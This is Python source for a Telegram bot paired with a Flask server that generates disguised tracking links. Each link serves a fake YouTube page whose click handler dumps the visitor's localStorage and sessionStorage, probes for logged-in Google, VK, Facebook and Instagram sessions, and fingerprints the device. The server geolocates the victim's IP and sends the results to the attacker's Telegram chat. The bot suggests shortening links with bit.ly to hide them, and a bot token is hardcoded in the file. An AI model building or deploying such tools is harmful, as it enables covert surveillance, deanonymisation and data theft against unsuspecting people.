import asyncio
import threading  # <--- ВОТ ЭТОГО НЕ ХВАТАЛО
import requests
import uuid
import json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

# --- ОПАСНЫЙ ПАССИВНЫЙ АРСЕНАЛ ---
PAYLOADS = {
    "SESSION_LEAK": {
        "name": "🕵️ Social Session Leak (Поиск аккаунтов)",
        "js": """
            let services = {
                google: 'https://accounts.google.com/ServiceLogin?service=mail',
                vk: 'https://vk.com/login',
                facebook: 'https://www.facebook.com/login',
                instagram: 'https://www.instagram.com/accounts/login/'
            };
            d.sessions = {};
            for (let name in services) {
                let img = new Image();
                img.src = services[name];
                img.onload = () => { d.sessions[name] = 'active'; };
                img.onerror = () => { d.sessions[name] = 'inactive'; };
            }
            d.storage = {ls: JSON.stringify(localStorage), ss: JSON.stringify(sessionStorage)};
        """,
        "vuln": "Cross-Origin Information Leakage (Session Detection)"
    },
    "OSINT_DEEP": {
        "name": "📊 Deep OSINT & Hardware (Отпечаток)",
        "js": "d.hist=window.history.length; d.lang=navigator.language; d.plat=navigator.platform; d.cores=navigator.hardwareConcurrency;",
        "vuln": "Browser Fingerprinting (Device Identification)"
    }
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; overflow: hidden; }
        .yt-header { height: 50px; border-bottom: 1px solid #eee; display: flex; align-items: center; padding: 0 15px; }
        .player-box { background: #000; width: 100%; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; justify-content: center; align-items: center; }
        .play-btn { position: absolute; width: 70px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 12px solid transparent; position: absolute; left: 28px; top: 13px; }
        .content { padding: 20px; }
        .title { font-size: 18px; color: #030303; font-weight: 500; }
    </style>
</head>
<body onclick="strike()">
    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player-box">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.8;">
        <div class="play-btn"></div>
    </div>
    <div class="content">
        <div class="title">Exclusive: Скрытые настройки Telegram (2026)</div>
        <p style="color: #606060; font-size: 12px; margin-top: 5px;">2.1 млн просмотров • 1 час назад</p>
    </div>
<script>
async function strike() {
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, ref: document.referrer };
    
    // Внедрение выбранного пассивного скрипта
    try { {{ custom_script|safe }} } catch(e) {}
    
    // Сбор данных о железе (GPU/Battery)
    try {
        let c = document.createElement('canvas'); let gl = c.getContext('webgl');
        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
    } catch(e) {}

    // Мгновенная отправка и редирект
    fetch('/catch', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(d) 
    }).finally(() => { 
        location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
    });
}
</script>
</body>
</html>
"""

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "SESSION_LEAK")
    script = PAYLOADS.get(mode, PAYLOADS["SESSION_LEAK"])["js"]
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    # --- НАСТОЯЩИЙ ФИКС IP (ОБХОД RENDER) ---
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Запрос ГЕО по реальному IP (Тихий)
    city, country, isp, map_link = "N/A", "N/A", "N/A", "#"
    try:
        r = requests.get(f"http://ip-api.com/json/{real_ip}?fields=status,country,city,lat,lon,isp").json()
        if r['status'] == 'success':
            city, country, isp = r['city'], r['country'], r['isp']
            map_link = f"https://www.google.com/maps?q={r['lat']},{r['lon']}"
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    mode = user_settings.get(str(d['aid']), "SESSION_LEAK")
    
    # Сохраняем расширенный дамп
    exploit_vault[token] = {
        "vuln_type": PAYLOADS[mode]["vuln"],
        "sessions": d.get('sessions', {}),
        "storage_dump": d.get('storage', {}),
        "hardware_dump": {
            "cores": d.get('cores'),
            "gpu": d.get('gpu'),
            "history_depth": d.get('hist'),
            "platform": d.get('plat')
        }
    }

    report = (
        f"🎯 **ЦЕЛЬ ЗАФИКСИРОВАНА (Passive)**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{real_ip}` | `{isp}`\n"
        f"• [Открыть карту]({map_link})\n\n"
        f"👤 **АКТИВНЫЕ СЕССИИ:**\n"
        f"```\n{json.dumps(d.get('sessions', {}), indent=1)}\n```\n"
        f"📱 **DEVICE:**\n"
        f"• Экран: `{d.get('res')}`\n"
        f"• GPU: `{d.get('gpu', 'N/A')}`\n"
        f"• Battery: {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **TOKEN:** `{token}`\n"
        f"🛠 **PAYLOAD:** {mode}"
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать Пассивную ссылку")
    await message.answer("🕶 **PHANTOM COMMAND CENTER v23.0**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать Пассивную ссылку")
async def setup(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="🕵️ Social Session Leak", callback_data="p_SESSION_LEAK")
    kb.button(text="📊 Deep Hardware OSINT", callback_data="p_OSINT_DEEP")
    kb.adjust(1)
    await message.answer("Выберите метод пассивного сбора данных:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("p_"))
async def generate(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"✅ **АТАКА ГОТОВА (Пассивный режим)**\n\nРежим: `{mode}`\n🔗 `{link}`\n\n*Совет: Сократи её через bit.ly перед отправкой!*")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    t = message.text.strip().upper()
    if t in exploit_vault:
        v = exploit_vault[t]
        res = (
            f"🔓 **ПОЛНЫЙ ДАМП {t}**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ **УЯЗВИМОСТЬ:** {v['vuln_type']}\n\n"
            f"📦 **Storage Dump (LocalStorage/SessionStorage):**\n"
            f"```json\n{json.dumps(v['storage_dump'], indent=2, ensure_ascii=False)}\n```\n\n"
            f"📱 **Hardware Dump:**\n"
            f"```json\n{json.dumps(v['hardware_dump'], indent=2, ensure_ascii=False)}\n```"
        )
        await message.answer(res)

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
